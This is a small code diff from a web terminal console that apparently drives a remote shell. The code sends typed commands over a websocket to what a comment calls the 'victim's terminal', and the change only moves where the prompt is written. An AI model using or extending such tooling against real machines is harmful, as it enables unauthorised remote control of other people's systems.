@@ -132,12 +132,12 @@
         term.clear();
       }
       else {
-        term.write('\r\n$ ');
         // Send command to victim's terminal via websocket.
         webSocket.send(JSON.stringify({
               'message': command
           }));
       }
+      term.write('\r\n$ ');
       index = command_history.length;
       command = '';
       cursor = 0;
